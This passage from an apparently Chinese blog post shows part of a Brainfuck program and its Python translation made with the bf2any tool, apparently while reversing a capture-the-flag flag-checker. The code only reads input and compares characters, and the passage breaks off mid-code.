gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-][-]&gt;[-]++++[&lt;++++++++&gt;-]&lt;&gt;&lt;&lt;&gt;&gt;[-]&gt;[-]&lt;&lt;[&gt;[-]&lt;&lt;[&gt;&gt;+&gt;+&lt;&lt;&lt;-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]+&gt;[[-]&lt;-&lt;&lt;-&gt;&gt;&gt;]&lt;&lt;-]&lt;[-]&gt;&gt;[&lt;&lt;+&gt;&gt;-]&lt;&lt;][-]&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-][-]+&lt;[&gt;-&gt;[-]&gt;[-]&lt;&gt;++++++[&lt;+++++++++++&gt;-]&lt;+.&gt;++++[&lt;+++++++++++&gt;-]&lt;.-.-------.+++++++++++.&gt;++++[&lt;----&gt;-]&lt;-.&gt;+++[&lt;++++++&gt;-]&lt;+.-.&gt;+++++++++[&lt;---------&gt;-]&lt;-.&lt;&lt;[-]]&gt;[&gt;[-]&gt;[-]&lt;&gt;++++++++++[&lt;+++++++++++&gt;-]&lt;.+.-.+.-.+.&lt;-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><br></pre></td></tr></table></figure>
<p>&emsp; 使用<code>bf2any</code><a target="_blank" rel="noopener" href="https://github.com/rdebath/Brainfuck/blob/master/bf2any，转成python代码，如下：">https://github.com/rdebath/Brainfuck/blob/master/bf2any，转成python代码，如下：</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def brainfuck(argv):</span><br><span class="line">    m = [0] * 1048832</span><br><span class="line">    p = 256</span><br><span class="line">    m[p+41] = 1</span><br><span class="line">    m[p+45] = 38</span><br><span class="line">    while m[p+45] :</span><br><span class="line">        v = m[p+44]</span><br><span class="line">        m[p+46] = v</span><br><span class="line">        m[p+47] = m[p+47]+v</span><br><span class="line">        v = m[p+46]</span><br><span class="line">        m[p+44] = v</span><br><span class="line">        m[p+46] = 1</span><br><span class="line">        if m[p+47] :</span><br><span class="line">            m[p+46] -= 1</span><br><span class="line">            m[p+44] -= 1</span><br><span class="line">            m[p+47] = 0</span><br><span class="line">        m[p+45] -= 1</span><br><span class="line">    v = m[p+46]</span><br><span class="line">    m[p+44] = v</span><br><span class="line">    m[p+46] = 0</span><br><span class="line">    while m[p+44] :</span><br><span class="line">        v = m[p+41]</span><br><span class="line">        m[p+44] = v</span><br><span class="line">        m[p+45] = v</span><br><span class="line">        v = m[p+45]</span><br><span class="line">        m[p+41] = v</span><br><span class="line">        m[p+45] = 0</span><br><span class="line">        if m[p+44] :</span><br><span class="line">            m[p+43] += 1</span><br><span class="line">            m[p+44] = 0</span><br><span class="line">    while m[p+43] :</span><br><span class="line">        m[p+44] = 0</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        c = sys.stdin.read(1);</span><br><span class="line">        if c != &#x27;&#x27; :</span><br><span class="line">            m[p+44] = ord(c)</span><br><span class="line">        v = m[p+44]</span><br><span class="line">        m[p+45] = v</span><br><span class="line">        m[p+43] = v</span><br><span class="line">        v = m[p+45]</span><br><span class="line">        m[p+44] = v</span><br><span class="line">        v = m[p+43]</span><br><span class="line">        m[p+44] = v</span><br><span class="line">        m[p+45] = v</span><br><span class="line">        v = m[p+45]</span><br><span class="line">        m[p+43] = v</span><br><span class="line">        v = m[p+44]</span><br><span class="line">        m[p+45] = 10</span><br><span class="line">        m[p+45] = m[p+45]-v</span><br><span class="line">        m[p+44] = 1</span><br><span class="line">        if m[p+45] :</span><br><span class="line">            m[p+44] -= 1</span><br><span class="line">            m[p+45] = 0</span><br><span class="line">        while m[p+44] :</span><br><span class="line">            m[p+46] = 0</span><br><span class="line">            m[p+47] = 0</span><br><span class="line">            m[p+41] = 0</span><br><span class="line">            m[p+44] = 0</span><br><span class="line">        v = m[p+1]</span><br><span class="line">        m[p+44] = v</span><br><span class="line">        m[p+45] = v</span><br><span class="line">        m[p+45] += 1</span><br><span class="line">        v = m[p+45]</span><br><span class="line">        m[p+1] = v</span><br><span class="line">        v = m[p+43]</span><br><span class="line">        m[p+46] = v</span><br><span class="line">        m[p+47] = v</span><br><span class="line">        v = m[p+47]</span><br><span class="line">        m[p+43] = v</span><br><span class="line">        m[p+45] = 0</span><br><span class="line">        m[p+47] = 0</span><br><span class="line">        while m[p+44] :</span><br><span class="line">            v = m[p+46]</span><br><span class="line">            m[p+47] = v</span><br><span class="line">            m[p+45] += 1</span><br><span class="line">            v = m[p+45]</span><br><span class="line">            m[p+46] = v</span><br><span class="line">            m[p+44] -= 1</span><br><span class="line">            v = m[p+44]</span><br><span class="line">            m[p+45] = v</span><br><span class="line">            m[p+44] = 0</span><br><span class="line">            p += 1</span><br><span class="line">        v = m[p+46]</span><br><span class="line">        m[p+47] = v</span><br><span class="line">        m[p+2] = v</span><br><span class="line">        v = m[p+47]</span><br><span class="line">        m[p+46] = v</span><br><span class="line">        v = m[p+46]</span><br><span class="line">        m[p+44] = v</span><br><span class="line">        m[p+46] = 0</span><br><span class="line">        m[p+47] = 0</span><br><span class="line">        while m[p+45] :</span><br><span class="line">            v = m[p+44]</span><br><span class="line">            m[p+43] = m[p+43]+v</span><br><span class="line">            m[p+45] -= 1</span><br><span class="line">            v = m[p+45]</span><br><span class="line">            m[p+44] = v</span><br><span class="line">            m[p+45] = 0</span><br><span class="line">            p -= 1</span><br><span class="line">        v = m[p+1]</span><br><span class="line">        m[p+44] = v</span><br><span class="line">        m[p+45] = v</span><br><span class="line">        v = m[p+45]</span><br><span class="line">        m[p+1] = v</span><br><span class="line">        m[p+43] = 0</span><br><span class="line">        m[p+45] = 38</span><br><span class="line">        m[p+46] = 0</span><br><span class="line">        m[p+47] = 0</span><br><span class="line">        while m[p+45] :</span><br><span class="line">            v = m[p+44]</span><br><span class="line">            m[p+46] = v</span><br><span class="line">            m[p+47] = m[p+47]+v</span><br><span class="line">            v = m[p+46]</span><br><span class="line">            m[p+44] = v</span><br><span class="line">            m[p+46] = 1</span><br><span class="line">            if m[p+47] :</span><br><span class="line">                m[p+46] -= 1</span><br><span class="line">                m[p+44] -= 1</span><br><span class="line">                m[p+47] = 0</span><br><span class="line">            m[p+45] -= 1</span><br><span class="line">        v = m[p+46]</span><br><span class="line">        m[p+44] = v</span><br><span class="line">        m[p+46] = 0</span><br><span class="line">        while m[p+44] :</span><br><span class="line">            v = m[p+41]</span><br><span class="line">            m[p+44] = v</span><br><span class="line">            m[p+45] = v</span><br><span class="line">            v = m[p+45]</span><br><span class="line">            m[p+41] = v</span><br><span class="line">            m[p+45] = 0</span><br><span class="line">            if m[p+44] :</span><br><span class="line">                m[p+43] += 1</span><br><span class="line">                m[p+44] = 0</span><br><span class="line">    v = m[p+2]</span><br><span class="line">    m[p+50] = v</span><br><span class="line">    m[p+51] = v</span><br><span class="line">    v = m[p+51]</span><br><span class="line">    m[p+2] = v</span><br><span class="line">    v = m[p+50]</span><br><span class="line">    m[p+48] = v</span><br><span class="line">    v = m[p+48]</span><br><span class="line">    m[p+49] = 102</span><br><span class="line">    m[p+49] = m[p+49]-v</span><br><span class="line">    m[p+50] = 0</span><br><span class="line">    m[p+51] = 0</span><br><span class="line">    m[p+48] = 1</span><br><span class="line">    m[p+47] = 0</span><br><span class="line">    m[p+46] = 0</span><br><span class="line">    m[p+45] = 0</span><br><span class="line">    m[p+44] = 0</span><br><span class="line">    if m[p+49] :</span><br><span class="line">        m[p+48] -= 1</span><br><span class="line">        m[p+49] = 0</span><br><span class="line">    while m[p+48] :</span><br><span class="line">        m[p+49] = 0</span><br><span class="line">        m[p+48] = 1</span><br><span class="line">        while m[p+48] :</span><br><span class="line">            v = m[p+49]</span><br><span class="line">            m[p+50] = 1</span><br><span class="line">            m[p+50] = m[p+50]+v</span><br><span class="line">            m[p+48] -= 1</span><br><span class="line">            v = m[p+48]</span><br><span class="line">            m[p+49] = v</span><br><span class="line">            m[p+48] = 0</span><br><span class="line">            p += 1</span><br><span class="line">        v = m[p+2]</span><br><span class="line">        m[p+50] = v</span><br><span class="line">        m[p+51] = v</span><br><span class="line">        v = m[p+51]</span><br><span class="line">        m[p+2] = v</span><br><span class="line">        v = m[p+50]</span><br><span class="line">        m[p+48] = v</span><br><span class="line">        m[p+50] = 0</span><br><span class="line">        m[p+51] = 0</span><br><span class="line">        while m[p+49] :</span><br><span class="line">            v = m[p+48]</span><br><span class="line">            m[p+47] = m[p+47]+v</span><br><span class="line">            m[p+49] -= 1</span><br><span class="line">            v = m[p+49]</span><br><span class="line">            m[p+48] = v</span><br><span class="line">            m[p+49] = 0</span><br><span class="line">            p -= 1</span><br><span class="line">        v = m[p+48]</span><br><span class="line">        m[p+49] = 108</span><br><span class="line">        m[p+49] = m[p+49]-v</span><br><span class="line">        m[p+50] = 0</span><br><span class="line">        m[p+48] = 1</span><br><span class="line">        if m[p+49] :</span><br><span class="line">            m[p+48] -= 1</span><br><span class="line">            m[p+49] = 0</span><br><span class="line">        if m[p+48] :</span><br><span class="line">            m[p+47] += 1</span><br><span class="line">            m[p+48] = 0</span><br><span 